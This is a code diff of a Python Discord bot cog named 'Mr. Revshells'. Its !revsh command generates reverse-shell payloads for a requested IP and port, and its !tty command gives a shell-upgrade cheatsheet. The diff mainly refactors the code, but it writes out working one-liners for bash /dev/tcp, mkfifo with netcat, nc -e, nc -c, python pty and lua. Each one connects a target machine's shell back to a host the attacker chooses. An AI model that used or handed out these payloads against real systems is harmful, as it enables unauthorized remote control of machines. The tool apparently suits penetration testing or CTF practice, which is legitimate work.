@@ -3,7 +3,7 @@ from discord.ext import commands
 import logging
 
 logger = logging.getLogger("RS-Commands")
-rs_types = ["bash-i", "bash196", "readline", "mkfifo", "py1", "py2", "nc-e", "nc-c", "lua"]
+RS_TYPES = ["bash-i", "bash196", "readline", "mkfifo", "py1", "py2", "nc-e", "nc-c", "lua"]
 
 class ReverseShellCog(commands.Cog):
     def __init__(self, bot):
@@ -11,44 +11,57 @@ class ReverseShellCog(commands.Cog):
 
     @commands.command(help="Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.\n Usage: !revsh <type> <ip> <port>\n Types: bash-i, bash196, readline, mkfifo, py1, py2, nc-e, nc-c, lua")
     async def revsh(self, ctx, type: str, ip: str, port: int):
-        """Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port."""
-        logger.info(f"Received request for reverse shell: {type}, {ip}, {port} \nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
+        """Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.
+        
+        Args:
+            type (str): Type of reverse shell to generate. Possible values: bash-i, bash196, readline, mkfifo, py1, py2, nc-e, nc-c, lua.
+            ip (str): IP address of the target machine.
+            port (int): Port number of the target machine.
+        """
+        logger.info(f" Received request for reverse shell: {type}, {ip}, {port} \nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
 
+        await ctx.message.add_reaction("💀")
+
+
+        # Pre-Conditions
         if port < 1 or port > 65535:
-            logger.error(f"Invalid port number for reverse shell: {port}\n")
+            logger.error(f" Invalid port number for reverse shell: {port}\n")
             return await ctx.send("Invalid port number. (Range 1-65535)")
 
-        if type.lower() not in rs_types:
-                logger.error(f"Invalid type: {type}\n")
+        if type.lower() not in RS_TYPES:
+                logger.error(f" Invalid type: {type}\n")
                 return await ctx.send("Invalid type. See the help message for the list of valid types.")
 
+
+        # Payload request
         match type.lower():
             case "bash-i":
-                    payload = f"```bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1```"
+                payload = f"```bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1```"
 
             case "bash196":
-                    payload = f"```bash\n0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196```"
+                payload = f"```bash\n0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196```"
 
             case "readline":
-                    payload = f"```bash\nexec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done```"
+                payload = f"```bash\nexec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done```"
 
             case "mkfifo":
-                    payload = f"```bash\nmkfifo pipe;cat pipe | /bin/sh -i 2>&1 | nc {ip} {port} >/dev/null; rm pipe```"
+                payload = f"```bash\nmkfifo pipe;cat pipe | /bin/sh -i 2>&1 | nc {ip} {port} >/dev/null; rm pipe```"
 
             case "py1":
-                    payload = f"```python\npython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'```"
+                payload = f"```python\npython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'```"
                     
             case "py2":
-                    payload = f"```python\nexport RHOST={ip};export RPORT={port};python -c 'import socket,sys,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'```"
+                payload = f"```python\nexport RHOST={ip};export RPORT={port};python -c 'import socket,sys,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'```"
 
             case "nc-e":
-                    payload = f"```bash\nnc -e /bin/bash {ip} {port}```"
+                payload = f"```bash\nnc -e /bin/bash {ip} {port}```"
 
             case "nc-c":
-                    payload = f"```bash\nnc -c 'exec /bin/bash' {ip} {port}```"
+                payload = f"```bash\nnc -c 'exec /bin/bash' {ip} {port}```"
 
             case "lua":
-                    payload = f"```lua\nlua -e \"require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"{ip}\",{port});os.execute(\"/bin/bash -i <&3 >&3 2>&3);\"```"
+                payload = f"```lua\nlua -e \"require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"{ip}\",{port});os.execute(\"/bin/bash -i <&3 >&3 2>&3);\"```"
+
 
         embed = discord.Embed(
             title = f"Reverse Shell Generator 💀",
@@ -59,14 +72,19 @@ class ReverseShellCog(commands.Cog):
         embed.set_thumbnail(url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")
         embed.set_author(name="Mr. Revshells", icon_url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")
 
-        logger.info(f"Sent {type} reverse shell to {ctx.author.name}\n")
+        logger.info(f" Sent {type} reverse shell to {ctx.author.name}\n")
         await ctx.send(embed=embed)
         return
+
+
 
     @commands.command(help="Give a cheatsheet to establish a full interactive TTY session after achieving a reverse shell.\nUsage: !tty")
     async def tty(self, ctx):
         """Give a cheatsheet to establish a full interactive TTY session after achieving a reverse shell."""
-        logger.info(f"TTY requested\nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
+        logger.info(f" TTY requested\nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
+
+        await ctx.message.add_reaction("💀")
+
 
         embed = discord.Embed(
                 title="TTY Cheatsheet 🖥️",
@@ -84,8 +102,10 @@ class ReverseShellCog(commands.Cog):
         embed.set_thumbnail(url="https://play.pokemonshowdown.com/sprites/trainers/blaine-lgpe.png")
         embed.set_author(name="Mr. Revshells", icon_url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")
 
-        logger.info(f"Sent TTY cheatsheet to {ctx.author.name}\n")
+        logger.info(f" Sent TTY cheatsheet to {ctx.author.name}\n")
         await ctx.send(embed=embed)
+
+
 
 async def setup(bot):
     await bot.add_cog(ReverseShellCog(bot))
